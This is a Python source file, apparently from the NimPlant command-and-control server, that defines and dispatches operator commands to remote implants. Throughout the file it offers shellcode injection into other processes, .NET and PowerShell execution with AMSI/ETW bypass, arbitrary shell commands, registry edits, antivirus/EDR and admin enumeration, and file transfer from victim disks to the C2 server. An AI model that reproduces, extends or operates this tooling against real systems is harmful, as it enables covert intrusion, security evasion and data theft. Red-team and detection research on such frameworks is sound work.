import shlex
from .func import log, nimplantPrint
from .nimplant import nps

def getAvailableCommands():
    availableCommands = {}
    availableCommands['Server Commands'] = {
        'clear': 'Clear the screen.',
        'getpid': 'Show process ID of the currently selected NimPlant.',
        'help': '<command> Show this help menu, or command-specific help.',
        'hostname': 'Show hostname of the currently selected NimPlant.',
        'ipconfig': 'List adapter information of the currently selected NimPlant.',
        'list': 'Show list of active NimPlants.',
        'nimplant': 'Show info about the currently selected NimPlant.',
        'osbuild': 'Show operating system build information for the currently selected NimPlant.',
        'select': '[id] Select another NimPlant.',
        'exit': 'Exit the server, killing all NimPlants.'
    }
    availableCommands['NimPlant Commands'] = {
        'cat': '[filename] Print a file\'s contents to the screen.',
        'cd': '[directory] Change the working directory.',
        'cp': '[source] [destination] Copy a file or directory.',
        'curl': '[url] Get a webpage remotely and print results to stdout.',
        'download': '[remotefilepath] <localfilepath> Download a file from NimPlant\'s disk to the C2 server.',
        'env': 'Get environment variables.',
        'execute-assembly': '<BYPASSAMSI=0> <BLOCKETW=0> [localfilepath] <arguments> Execute .NET assembly from memory. AMSI/ETW patched by default. Loads the CLR.',
        'getAv': 'List Antivirus / EDR products on target using WMI.',
        'getDom': 'Get the domain the target is joined to.',
        'getLocalAdm': 'List local administrators on the target using WMI.',
        'kill': 'Kill the currently selected NimPlant.',
        'ls': '<path> List files and folders in a certain directory. Lists current directory by default.',
        'mkdir': '[directory] Create a directory (and its parent directories, if required).',
        'mv': '[source] [destination] Move a file or directory.',
        'ps': 'List running processes on the target. Indicates current process.',
        'pwd': 'Get the current working directory.',
        'reg': '[query|add] [path] <key> <value> Query or modify the registry. New values will be added as REG_SZ.',
        'rm': '[file] Remove a file or directory.',
        'run': '[binary] <arguments> Run a binary from disk. Returns output, but blocks NimPlant while running.',
        'shell': '[command] Execute a shell command.',
        'shinject': '[targetpid] [localfilepath] Load raw shellcode from a file and inject it into the specified process\'s memory space using dynamic invocation.',
        'sleep': '[sleeptime] <jitter%> Change the sleep time of the current NimPlant.',
        'powershell': '<BYPASSAMSI=0> <BLOCKETW=0> [command] Execute a PowerShell command in an unmanaged runspace. Loads the CLR.',
        'upload': '[localfilepath] <remotefilepath> Upload a file from the C2 server to NimPlant\'s disk.',
        'wget': '[url] <outfile> Download a file to disk remotely.',
        'whoami': 'Get the user ID that NimPlant is running as.'
    }
    return availableCommands

def getRiskyCommands():
    riskyCommands = ['execute-assembly', 'powershell', 'shell', 'shinject']
    return riskyCommands

def getAllAvailableCommands():
    availableCommands = getAvailableCommands()
    allCommands = {**availableCommands['Server Commands'], **availableCommands['NimPlant Commands']}
    return allCommands

def getAllAvailableCommandsList():
    return getAllAvailableCommands().keys()

def handleCommand(command, np = None):
    if np == None:
        np = nps.getActiveNimPlant()

    log(f"NimPlant {np.id} $ > {command}", np.guid)

    try:
        args = shlex.split(command.replace("\\", "\\\\"))
        cmd = command.lower().split(' ')[0]
        nimplantCmds = [cmd.lower() for cmd in getAvailableCommands()['NimPlant Commands'].keys()]

        # Handle commands
        if cmd == "":
            pass

        elif cmd in getRiskyCommands() and not np.riskyMode:
            nimplantPrint(f"Uh oh, you compiled this Nimplant in safe mode and '{cmd}' is considered to be a risky command. Please enable 'riskyMode' in 'config.toml' and re-compile Nimplant!", np.guid)

        elif cmd == "clear":
            from .func import cls
            cls()

        elif cmd == "getpid":
            nimplantPrint(f"NimPlant PID is: {np.pid}", np.guid)

        elif cmd == "help":
            if len(args) == 2:
                from .func import printCommandHelp
                printCommandHelp(np.guid, args[1])
            else:
                from .func import printHelpMenu
                printHelpMenu(np.guid)

        elif cmd == "hostname":
            nimplantPrint(f"NimPlant hostname is: {np.hostname}", np.guid)

        elif cmd == "ipconfig":
            nimplantPrint(f"NimPlant external IP address is: {np.ipAddrExt}", np.guid)
            nimplantPrint(f"NimPlant internal IP address is: {np.ipAddrInt}", np.guid)

        elif cmd == "list":
            nps.getInfo(np.guid)

        elif cmd == "nimplant":
            np.getInfo()

        elif cmd == "osbuild":
            nimplantPrint(f"NimPlant OS build is: {np.osBuild}", np.guid)

        elif cmd == "select":
            if len(args) == 2:
                nps.selectNimPlant(args[1], np)
            else:
                nimplantPrint("Invalid argument length. Usage: 'select [NimPlant ID]'.", np.guid)

        elif cmd == "exit":
            from .func import exitServerConsole
            exitServerConsole()

        elif cmd == "upload":
            from .func import uploadFile
            uploadFile(np, args)

        elif cmd == "download":
            from .func import downloadFile
            downloadFile(np, args)

        elif cmd == "execute-assembly":
            from .func import executeAssembly
            executeAssembly(np, args)

        elif cmd == "shinject":
            from .func import shinject
            shinject(np, args)

        elif cmd == "powershell":
            from .func import powershell
            powershell(np, args)

        # Handle commands that do not need any server-side handling
        elif cmd in nimplantCmds:
            if np.getTask() is None:
                np.setTask(command)
                nimplantPrint(f"Staged command '{command}'.", np.guid)
            else:
                np.setTask(command)
                nimplantPrint(f"Changed NimPlant command to '{command}'.", np.guid)
        else:
            nimplantPrint(f"Unknown command. Enter 'help' to get a list of commands.", np.guid)

    except Exception as e:
        nimplantPrint(f"An unexpected exception occurred when handling command: {repr(e)}", np.guid)